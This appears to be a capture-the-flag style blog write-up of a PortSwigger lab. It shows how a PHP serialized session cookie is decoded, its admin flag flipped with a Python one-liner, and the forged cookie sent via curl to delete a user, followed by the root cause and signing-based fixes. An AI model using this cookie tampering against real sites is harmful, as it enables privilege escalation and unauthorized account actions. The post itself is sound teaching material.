---
layout: post
title: "PortSwigger: Modifying Serialized Objects"
date: 2027-10-10 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, Deserialization]
tags: [portswigger, deserialization, insecure-deserialization, php, session-cookie, privilege-escalation, cwe-502]
---

This PortSwigger Web Security Academy lab is the simplest possible **insecure
deserialization** bug: the session cookie is a PHP serialized object with no signature,
so you can decode it, flip a single `admin` boolean from false to true, re-encode it,
and walk into the admin panel. No gadget chain, no remote code execution — just
tampering with state the server should never have trusted.
([CWE-502](https://cwe.mitre.org/data/definitions/502.html), Deserialization of Untrusted
Data — OWASP A08:2021 Software and Data Integrity Failures.)

## Overview

After logging in as the low-privilege user `wiener:peter`, the app tracks who you are
with a `session` cookie that *looks* opaque but is just two layers of encoding over a
PHP object. Because there is no HMAC or signature protecting the bytes, the cookie is
fully attacker-controlled. The lab is solved by forging an administrator session and
deleting the user `carlos`.

## Decoding the cookie

The post-login `session` cookie looks like this:

```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3D
```

URL-decode (`%3D` → `=`) then Base64-decode it and a PHP serialized object falls out:

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```

Reading the PHP serialization tokens:

- `O:4:"User":2` — an **object** of class `User` (the name is 4 characters) with **2** properties
- `s:8:"username";s:6:"wiener"` — a **string** property `username` whose value is the 6-char string `wiener`
- `s:5:"admin";b:0` — a **boolean** property `admin` set to `b:0`, i.e. **false**

That last token is the entire ballgame.

## Forging the admin cookie

Flip `b:0` (false) to `b:1` (true), then Base64- and URL-encode the result again. A
one-liner does the whole round-trip:

```bash
python3 -c "import base64,urllib.parse;raw='Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3D';d=base64.b64decode(urllib.parse.unquote(raw)).decode();n=d.replace(chr(34)+'admin'+chr(34)+';b:0',chr(34)+'admin'+chr(34)+';b:1');print(urllib.parse.quote(base64.b64encode(n.encode()).decode()))"
```

That prints the forged cookie:

```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30%3D
```

> Note: if you ever change a **string** value (not just a boolean), you must also fix
> its `s:<len>` length prefix, or `unserialize()` will reject the object.

## Becoming admin and solving

Send the forged cookie. `GET /my-account` now renders an **Admin panel** link, and the
privileged delete endpoint accepts the request:

```bash
curl -sk "https://YOUR-LAB-ID.web-security-academy.net/admin/delete?username=carlos" \
  -H "Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30%3D" \
  -o /dev/null -w "%{http_code}\n"
# 302
```

The `302` redirect (rather than a bounce back to the login form) confirms the forged
admin session was accepted and `carlos` was deleted. The lab status flips to **Solved**.

## Why it worked

Server-side, the code is effectively:

```php
$user = unserialize(base64_decode($_COOKIE['session']));
if ($user->admin === true) { /* show admin panel, allow delete */ }
```

The server reconstructs the `User` object straight from the cookie and trusts the
`admin` property — but it never verifies that the cookie is **authentic**. Anyone can
mint a `User` object with `admin = true`. The trust boundary is broken: a
security-critical decision is made from data the client fully controls.

This is **field tampering**, the gentlest form of insecure deserialization. It is
distinct from **PHP object injection**, where the attacker controls the serialized
**class name** and abuses a magic method (`__wakeup`, `__destruct`) to reach code
execution. Here the object stays benign; only its value is forged.

## The fix

- Don't store trust-bearing state in a client-controlled serialized blob. Keep
  authorization server-side, keyed by an opaque random session id.
- If a serialized object genuinely must round-trip through the client, **sign it** with
  an HMAC and verify the MAC *before* calling `unserialize()`:

  ```php
  $raw = base64_decode($_COOKIE['session']);
  $mac = substr($raw, 0, 32); $data = substr($raw, 32);
  if (!hash_equals($mac, hash_hmac('sha256', $data, $SECRET, true))) { abort(403); }
  $user = unserialize($data);
  ```

- After deserializing, **re-look-up** the user's role from the database instead of
  trusting whatever the deserialized object claims.

CWE-502: Deserialization of Untrusted Data — <https://cwe.mitre.org/data/definitions/502.html>
